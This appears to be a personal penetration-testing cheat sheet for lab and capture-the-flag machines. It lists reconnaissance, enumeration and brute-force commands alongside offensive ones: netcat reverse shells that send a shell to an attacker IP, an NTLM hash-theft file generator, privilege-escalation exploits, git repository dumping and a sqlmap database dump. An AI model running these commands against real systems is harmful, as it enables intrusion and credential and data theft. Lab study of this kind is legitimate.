<img width="482" height="50" alt="image" src="https://github.com/user-attachments/assets/1eb2faf6-1ffa-4dfe-b21d-338d6ea65d4b" />


### 🥔 SweetPotato Exploit

Repository: https://github.com/uknowsec/SweetPotato

    SweetPotato.exe

### 🐍 Python Fix (Dirsearch pyparsing issue)

    python3 -m pip install --force-reinstall pyparsing

### 🔐 NTLM Theft

Repo: https://github.com/mtth-bfft/ntlm_theft
 (or whichever you're using)

    python ntlm_theft.py -g all -s 192.168.45.212 -f test

### 🧨 Dirty Pipe Exploit

Linux Priv Esc:
https://github.com/rexpository/linux-privilege-escalation

### 📂 Git Dumper

Repo: https://github.com/arthaud/git-dumper

    ./git_dumper.py http://website.com/.git ~/website

### 📁 File Backup Commands (Windows)

#### CMD:

    copy admintool.exe admintool_backup.exe
    copy admintool.exe C:\backup\admintool_backup.exe


#### PowerShell:

    Copy-Item admintool.exe -Destination C:\backup\admintool_backup.exe


Backup example:

    admintool_backup1.exe

### 🌐 Reverse Shells

#### Windows (Netcat):

    .\nc64.exe -e cmd.exe 192.168.45.196 4444


#### Linux:

    nc <attacker_ip> 4444 -e /bin/bash

### 🔍 Nmap Scans

### Full port scan:

    sudo nmap -sV -T4 -p- -A 192.168.157.117


### Basic enumeration:

    nmap -v -p- 192.168.241.250


### Targeted ports:

    nmap -v -sV -sT -A -O -sC -p 135,139,445,3389,5040 192.168.241.250

📚 Useful Pentesting References
🔗 Important Resources

🔹 Google Meet:
https://meet.google.com/shb-fnmq-uhg

🔹 HackTricks – Brute Force Techniques:
https://book.hacktricks.wiki/en/generic-hacking/brute-force.html

🔹 Windows Privilege Escalation – Internal All The Things:
https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/

🔹 HTB Machines – Writeups & References:
https://htbmachines.github.io/

## ⚡ Nmap Commands CheatSheet

### 🔍 Basic & Full Scans

    sudo nmap -sC -sV -vv -oA nmap/caption 10.10.11.33
    sudo nmap -sC -sV -vv -oA 10.10.11.33
    nmap -v -sT -sV -T4 -p- 192.168.1.172

### 📄 Output to File

    nmap -v -sT -sC -A -O -p- 192.168.1.172 -o nmapoutput.txt
    nmap -v -sT -sV -sC -A -O -p 80,443 192.168.1.172 -o nmapoutput2.txt

### 🔢 Port-Specific Scans

    nmap -v -sU -sV -sC -A -O -p 161,500 192.168.1.172
    nmap -T4 -p- -A 10.10.10.11

### 🚀 Fast Scans (High Speed)

    nmap -T5 --top-ports 10000 -sS -n -Pn --min-rate=1000 10.10.11.35      # TCP
    nmap -T5 --top-ports 2000 -sS -n -Pn --min-rate=50 10.10.176.148       # TCP
    nmap -T5 --top-ports 10000 -sU -n -Pn --min-rate=5000 10.10.10.116     # UDP

### 🧪 Script Scans

    nmap -sC -sV -v 10.10.10.82
    nmap -v -sT -p 445 --script=smb-vuln-* 192.168.1.winxp

## 🛠️ SMB, Web Enumeration & Directory Brute-Force Commands

### 📁 SMB Enumeration
    smbclient -L //10.10.10.97 -U 'tyler'
    smbclient //10.10.10.100/Replication -U ""%""
    smbmap -H 10.10.11.35 -u 'anonymous'
    smbclient //10.10.11.35/HR -N

### 🌐 Web Directory Scanning

#### 🔎 Dirsearch

    dirsearch -u http://192.168.1.172:8080/
    dirsearch -u http://192.168.1.172:8080/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

### 🚀 Feroxbuster

    feroxbuster -u http://192.168.117.225:8090/ -k -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,js,css,txt,sh,bak,log,cgi,asp,aspx,html

    feroxbuster --url=http://192.168.1.218 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o output.txt

    feroxbuster -u http://10.10.10.93/ -x asp,aspx,txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 100 -s 200,301 -n

### 🧭 Dirb

    dirb http://192.168.1.109 -w /usr/share/wordlists/dirb/common.txt

### 🕵️‍♂️ Gobuster

    gobuster dir -u http://10.10.10.56:80 -w /usr/share/wordlists/dirb/small.txt -s 302,307,200,204,301,403 --status-codes-blacklist ""

    gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -s 302,307,200,204,301,403 --status-codes-blacklist "" -x sh

    gobuster dir -u http://192.168.1.9:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip

    gobuster dir -u http://192.168.1.9:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip,asp,aspx

    gobuster dir -u http://192.168.1.9:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x asp,aspx,txt

    gobuster dir -u http://192.168.1.9:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x *

    gobuster vhost --append-domain -u driftingblues.box -w /usr/share/wordlists/dirb/common.txt

    gobuster dir -r -u http://test.driftingblues.box/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,php,html -o dir-common.log

    gobuster dir --url https://earth.local -w /usr/share/wordlists/dirb/common.txt -k

### ⚡ FFUF (Fuzzing)
    ffuf -u http://192.168.1.7/history.php?FUZZ=sandeep \
    -w /usr/share/wordlists/dirb/big.txt \
    -b "PHPSESSID=li352tno8a68iutindhshcolen" -fs 0

### 🗄️ Remote Enumeration Tools
    enum4linux 192.168.1.3

### 🧩 Reverse Engineering (Ghidra)
     ghidra   # used to decompile binaries

### 🐚 Web Shells (Linux)
    /usr/share/webshells/php   # PHP backdoor location

### 🌍 Web Tech Scanning
    whatweb http://192.168.1.172:8080/
    nikto -h http://192.168.1.172/
    nuclei -u http://192.168.1.172:8080/

### 🐍 SQL Injection (sqlmap)
    sqlmap -u http://192.168.2.121/history.php?user=admin \
    --cookie="PHPSESSID=li352tno8a68iutindhshcolen" --dump


